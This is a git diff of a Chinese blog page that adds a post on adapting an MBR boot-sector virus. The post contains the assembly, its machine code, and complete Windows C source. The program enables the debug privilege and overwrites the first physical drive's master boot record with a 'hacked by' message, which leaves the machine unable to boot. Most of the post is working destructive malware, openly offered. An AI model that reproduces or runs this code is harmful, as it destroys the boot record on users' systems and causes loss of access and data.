@@ -6,16 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="https://thriumph.top">
-  <title>Archives | Thriumph</title>
+  <title>mbr引导区病毒 | Thriumph</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="keywords" content="pwn,re,渗透测试">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Thriumph">
-<meta property="og:url" content="https://thriumph.top/archives/page/4/index.html">
+  <meta name="description" content="改编一个mbr引导区病毒。">
+<meta name="keywords" content="病毒">
+<meta property="og:type" content="article">
+<meta property="og:title" content="mbr引导区病毒">
+<meta property="og:url" content="https://thriumph.top/mbr引导区病毒.html">
 <meta property="og:site_name" content="Thriumph">
+<meta property="og:description" content="改编一个mbr引导区病毒。">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-11-20T17:29:42.087Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Thriumph">
+<meta name="twitter:title" content="mbr引导区病毒">
+<meta name="twitter:description" content="改编一个mbr引导区病毒。">
   
     <link rel="alternative" href="/atom.xml" title="Thriumph" type="application/atom+xml">
   
@@ -154,428 +158,247 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-mbr引导区病毒" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      mbr引导区病毒
+    </h1>
+  
+
+
+        
+        <!--显示阅读次数-->
+        
+          <br/>
+          <a class="cloud-tie-join-count" href="javascript:void(0);" style="color:gray;font-size:14px;">
+          <span class="icon-sort"></span>
+          <span id="busuanzi_container_page_pv" style="color:#ef7522;font-size:14px;">
+                    阅读数: <span id="busuanzi_value_page_pv"></span>次 &nbsp;&nbsp;
+          </span>
+          </a>
+        
+        <!--显示阅读次数完毕-->
+
+
+        
+        <a href="/mbr引导区病毒.html" class="archive-article-date">
+  	<time datetime="2019-11-20T16:28:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-11-21</time>
+</a>
+        
+      </header>
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>改编一个mbr引导区病毒。</p>
+<a id="more"></a>
+<h1 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h1><p>一个简单的病毒，通过改写mbr,达到不能开机的效果😬</p>
+<h1 id="mbr"><a href="#mbr" class="headerlink" title="mbr"></a>mbr</h1><p>MBR是硬盘的主引导记录，也就是硬盘的0柱面、0磁头、1扇区称为主引导扇区。mbr占用512个字节(200h)，它用于硬盘启动时将系统控制权交给用户指定的,所以就是先于操作系统拿到控制权。<br>计算机开机启动过程：<a href="https://thriumph.top/windows%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B.html">https://thriumph.top/windows%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B.html</a></p>
+<h1 id="病毒原理"><a href="#病毒原理" class="headerlink" title="病毒原理"></a>病毒原理</h1><p>1.准备要写入的mbr。<br>2.提升程序权限,调用CreateFile函数去打开物理驱动器的时候，必须具备调试权限，否则就会打开失败，打开失败我们就不能对mbr进行读取了。<br>3.写入mbr,这样就有拿到优先操作系统的控制权了。</p>
+<h1 id="汇编源码"><a href="#汇编源码" class="headerlink" title="汇编源码"></a>汇编源码</h1><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">assume</span> <span class="built_in">cs</span>:code </span><br><span class="line">code <span class="meta">segment</span></span><br><span class="line"><span class="symbol">start:</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>,<span class="number">12h</span>           <span class="comment">;使用12号功能，对显示器进行设置    </span></span><br><span class="line"><span class="keyword">int</span> <span class="number">10h</span>              <span class="comment">;显示器的设置</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bp</span>, <span class="number">7C18H</span>        <span class="comment">;字符串的起始偏移</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">cx</span>, <span class="number">13h</span>          <span class="comment">;字符串长度</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">ax</span>,<span class="number">1301h</span>         <span class="comment">;AH = 13h 调用功能号13 ,在teletype模式下显示字符串,AL = 01H</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>,<span class="number">0Ch</span>           <span class="comment">;BH = 00H BL = 0CH</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">dx</span>,<span class="number">0h</span>            <span class="comment">;起始的行列</span></span><br><span class="line"><span class="keyword">int</span> <span class="number">10h</span></span><br><span class="line"><span class="keyword">jmp</span> $       <span class="comment">;无线循环，防止代码进入数据区</span></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
+
+<h1 id="获得机器码"><a href="#获得机器码" class="headerlink" title="获得机器码"></a>获得机器码</h1><p>B8 12 00 CD 10 BD 18 7C B9 13 00 B8 01 13 BB 0C 00 BA 00 00 CD 10 EB FE<br>之后将想要显示的字符串添加到后面<br>68 61 63 6B 20 62 79 20 54 68 72 69 75 6D 70 68<br>21 14<br>最后两个字节必须是55AA，因为55AA是MBR的结束标志</p>
+<h1 id="编写mbr引导区病毒"><a href="#编写mbr引导区病毒" class="headerlink" title="编写mbr引导区病毒"></a>编写mbr引导区病毒</h1><p>主程序有两个函数，一个函数提权，一个函数写mbr</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;winioctl.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> temp[<span class="number">512</span>]= &#123;</span><br><span class="line"><span class="number">0xB8</span>,<span class="number">0x12</span>,<span class="number">0x00</span>,<span class="number">0xCD</span>,<span class="number">0x10</span>,<span class="number">0xBD</span>,<span class="number">0x18</span>,<span class="number">0x7C</span>,<span class="number">0xB9</span>,<span class="number">0x13</span>,<span class="number">00</span>,<span class="number">0xB8</span>,<span class="number">0x01</span>,<span class="number">0x13</span>,<span class="number">0xBB</span>,<span class="number">0x0C</span>,<span class="number">00</span>,<span class="number">0xBA</span>,<span class="number">00</span>,<span class="number">00</span>,</span><br><span class="line"><span class="number">0xCD</span>,<span class="number">0x10</span>,<span class="number">0xE2</span>,<span class="number">0xFE</span>,<span class="number">0x68</span>,<span class="number">0x61</span>,<span class="number">0x63</span>,<span class="number">0x6B</span>,<span class="number">0x65</span>,<span class="number">0x64</span>,<span class="number">0x20</span>,<span class="number">0x62</span>,<span class="number">0x79</span>,<span class="number">0x20</span>,<span class="number">0x54</span>,<span class="number">0x68</span>,<span class="number">0x72</span>,<span class="number">0x69</span>,<span class="number">0x75</span>,</span><br><span class="line"><span class="number">0x6D</span>,<span class="number">0x70</span>,<span class="number">0x68</span>,<span class="number">0x20</span>,<span class="number">0x20</span>,<span class="number">0x20</span>,<span class="number">0x20</span>,<span class="number">0x20</span>,<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,</span><br><span class="line"><span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,</span><br><span class="line"><span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,</span><br><span class="line"><span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,</span><br><span class="line"><span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,</span><br><span class="line"><span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,</span><br><span class="line"><span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,</span><br><span class="line"><span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,</span><br><span class="line"><span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,</span><br><span class="line"><span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,</span><br><span class="line"><span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,</span><br><span class="line"><span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,</span><br><span class="line"><span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,</span><br><span class="line"><span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,</span><br><span class="line"><span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,</span><br><span class="line"><span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">00</span>,<span class="number">0x55</span>,<span class="number">0xAA</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//自己写一个函数来提权。</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetPrivileges</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//定义一个PLUID</span></span><br><span class="line">HANDLE hProcess;</span><br><span class="line">HANDLE hTokenHandle;</span><br><span class="line">TOKEN_PRIVILEGES tp;</span><br><span class="line"><span class="comment">//获取当前进程的句柄</span></span><br><span class="line">hProcess = GetCurrentProcess();</span><br><span class="line">OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hTokenHandle);</span><br><span class="line"><span class="comment">//函数查看系统权限的特权值，返回信息到一个LUID结构体里。</span></span><br><span class="line">tp.PrivilegeCount =<span class="number">1</span>; </span><br><span class="line">LookupPrivilegeValue(<span class="literal">NULL</span>,SE_DEBUG_NAME,&amp;tp.Privileges[<span class="number">0</span>].Luid); </span><br><span class="line">tp.Privileges[<span class="number">0</span>].Attributes =SE_PRIVILEGE_ENABLED;</span><br><span class="line">AdjustTokenPrivileges(hTokenHandle,FALSE,&amp;tp,<span class="keyword">sizeof</span>(tp),<span class="literal">NULL</span>,<span class="literal">NULL</span>); </span><br><span class="line">CloseHandle(hTokenHandle);</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//下面的函数来读取"\\\\.\\PHYSICALDRIVE0"</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ReadPHYSICALDRIVE0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hFile;</span><br><span class="line">DWORD dwReadSize;</span><br><span class="line"><span class="comment">// char lpBuffer[512];</span></span><br><span class="line"><span class="comment">//使用createFile打开这个文件</span></span><br><span class="line"><span class="keyword">char</span> str_Name[] = <span class="string">"\\\\.\\PHYSICALDRIVE0"</span>;</span><br><span class="line">hFile = CreateFile(str_Name, GENERIC_READ | GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING , FILE_ATTRIBUTE_NORMAL ,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line">MessageBox(<span class="number">0</span>, <span class="string">"wrong"</span>, <span class="string">"wrong"</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//用readfile来读取文件</span></span><br><span class="line">WriteFile(hFile, temp, <span class="number">512</span>, &amp;dwReadSize, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">GetPrivileges();</span><br><span class="line">ReadPHYSICALDRIVE0();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/关于二进制.html" class="archive-article-date">
-  	<time datetime="2019-08-10T12:30:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-08-10</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/关于二进制.html">关于二进制</a>
-    </h1>
-  
+      <!- 百度自动推送方式提交 -->
+      
+        <script>
+        (function(){
+            var bp = document.createElement('script');
+            var curProtocol = window.location.protocol.split(':')[0];
+            if (curProtocol === 'https') {
+                bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+            }
+            else {
+                bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+            }
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(bp, s);
+        })();
+        </script>
+      
+      <!- 百度自动推送方式提交结束 -->
 
-        <div class="article-info info-on-right">
+
+
+
+      
+      
+        <div class="declare">
+          <strong>本文作者：</strong>
           
+            Thriumph
+          
+          <br>
+          <strong>本文链接：</strong>
+          https://thriumph.top/mbr引导区病毒.html
+          <br>
+          <strong>版权声明：</strong>
+          本作品采用
+          <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a>
+          进行许可。转载请注明出处！
+          
+            <br>
+            <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="知识共享许可协议" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-sa/4.0/88x31.png"/></a>
+          
+        </div>
+      
+
+
+
+      
+    </div>
+  <div class="article-info article-info-index">
+    
+    
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">二进制安全</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">病毒</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+    
 
+    
+
+    
+      
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
   </div>
-</article>
-  
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://thriumph.top//mbr引导区病毒.html" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
     
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/RC4.html" class="archive-article-date">
-  	<time datetime="2019-07-09T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-10</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/RC4.html">RC4</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">加密算法</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
+    <div class="clearfix"></div>
   </div>
+</div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/一个有趣的a+b.html" class="archive-article-date">
-  	<time datetime="2019-07-09T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-07-10</time>
-</a>
+<nav id="article-nav">
+  
+    <a href="/贪吃蛇.html" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          贪吃蛇
+        
+      </div>
+    </a>
+  
+  
+    <a href="/windows启动过程.html" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">windows启动过程</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/一个有趣的a+b.html">一个有趣的a+b</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">加密算法</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
